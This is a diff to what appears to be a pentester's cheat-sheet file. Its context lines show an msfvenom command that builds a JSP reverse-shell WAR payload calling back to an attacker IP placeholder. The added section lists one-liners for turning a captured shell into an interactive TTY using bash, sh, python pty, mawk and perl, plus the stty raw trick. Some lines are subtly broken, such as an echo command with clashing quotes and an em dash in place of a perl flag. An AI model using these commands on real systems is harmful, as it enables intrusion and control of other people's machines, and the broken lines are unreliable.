@@ -53,4 +53,40 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker_ip> LPORT=3333 -f war > s
 
 http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 
+----------------------------------------------------------------------------------------------------------
+
+#Upgrading simple shells to fully interactive TTYs 
+
+//With bash;
+/bin/bash -i
+
+
+//With sh;
+/bin/sh -i
+
+
+//With echo;
+echo 'os.system('/bin/bash')'
+
+
+//With python;
+python -c 'import pty; pty.spawn("/bin/bash")'
+python -c 'import pty; pty.spawn("/bin/sh")'
+
+
+//With mawk;
+mawk 'BEGIN {system("/bin/sh")}' 
+
+
+//With perl;
+perl —e 'exec "/bin/sh";'
+
+
+//Completing long file paths;
+CTRL +Z
+stty raw -echo
+fg + [Enter x 2]
+
+----------------------------------------------------------------------------------------------------------
+
 
